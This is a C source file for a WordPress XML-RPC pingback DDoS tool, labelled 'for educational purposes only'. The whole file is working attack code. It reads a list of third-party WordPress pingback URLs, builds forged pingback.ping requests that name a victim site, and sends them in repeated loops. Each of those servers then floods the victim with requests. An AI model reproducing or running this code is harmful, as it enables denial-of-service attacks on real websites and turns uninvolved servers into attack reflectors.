/*
 *  wordpress xmlrpc.php DDoS v. 1.0
 *  for educational purposes only
 * 
 *  v. 1.0 works only if xmlrpc.php
 *  is in the wwwroot: www.target/xmlrpc.php
 * 
 *  wp_pingback file syntax:    
 *    www.target/dir/?p=1
 *    www.target/dir/
 *    www.target/?page_id=5
 *    ...
 *    last line: empty
 * 
 *  tested as victim with:
 *    ngrok
 *    wordpot
 *    wireshark
 * 
 *  by tesla
 */

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#define W "\033[97m"
#define N "\033[0m"
#define R "\033[91m"
#define MAX 1000

int main(int argc, char *argv[]){
  if(argc != 4){
    fprintf(stderr, W "\nUsage: worDDoSpress requests targets_file victim\n" N);
    fprintf(stderr, "\nEx: worDDoSpress 1000 wp_pingback www.victim.com\n\n");
    exit(1);
  }

  int cnt, ccnt, evilsocket, rand_post;
  int cnt_lines = 0;
  int chars = 0;
  int req = atoi(argv[1]);
  char *file = argv[2];
  FILE *wp_file;

  wp_file = fopen(file, "r");
  if(wp_file == 0){
    fprintf(stderr, R "File not Found!!\n" N);
    exit(2);
  }
  while(!feof(wp_file)){
    chars = fgetc(wp_file);
    if(chars == '\n'){
      cnt_lines++;
    }
  }
  fclose(wp_file);

  char targets[100];
  char arr_targets[cnt_lines][100];
  wp_file = fopen(file, "r");
  cnt = 0;
  while(cnt < cnt_lines){
    if(fgets(targets, 100, wp_file)){
      strcpy(arr_targets[cnt], targets);
    }
    cnt++;
  }
  fclose(wp_file);

  cnt = 0;
  ccnt = 0;
  srand(time(NULL));
  char random_number[10];
  char target[30];
  char buff[cnt_lines][MAX];
  struct hostent *host;
  struct sockaddr_in serv_addr;
  while(ccnt < req){
    while(cnt < cnt_lines){
      rand_post = rand()%10000 + 1;
      sprintf(random_number, "?p=%d", rand_post);
      strcpy(target, argv[3]);
      strcat(target, random_number);
      char *split_target_uri = strdup(arr_targets[cnt]);
      char *domain = strtok(split_target_uri, "/");
      char *data1 = "<?xml version=\"1.0\"?><methodCall>"
        "<methodName>pingback.ping</methodName><params><param><value><string>http://";
      char *data2 = target;
      char *data3 = "</string></value></param><param><value><string>http://";
      char *data4 = arr_targets[cnt];
      char *data5 = "</string></value></param></params></methodCall>";
      int content_lenght = (int)strlen(data1) + (int)strlen(data2) +
        (int)strlen(data3) + (int)strlen(data4) + (int)strlen(data5);
      char *content;
      content = malloc(strlen(data1) + strlen(data2) + strlen(data3) + strlen(data4) + strlen(data5) + 1);
      strcpy(content, data1);
      strcat(content, data2);
      strcat(content, data3);
      strcat(content, data4);
      strcat(content, data5);
      sprintf(buff[cnt], "POST /xmlrpc.php HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n\r\n%s", domain, content_lenght, content);
    
      host = gethostbyname(domain);
      memset(&serv_addr, 0, sizeof(serv_addr));
      serv_addr.sin_family = AF_INET;
      serv_addr.sin_port = htons(80);
      serv_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *) host->h_addr)));
      evilsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      connect(evilsocket, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
      if(write(evilsocket, buff[cnt], strlen(buff[cnt]) + 1) == -1)
        exit(3);
      cnt++;
    }
    cnt = 0;
    ccnt++;
  }
  memset(&buff, 0, sizeof(buff));
  memset(&host, 0, sizeof(host));
  memset(&serv_addr, 0, sizeof(serv_addr));
  return(0);
}
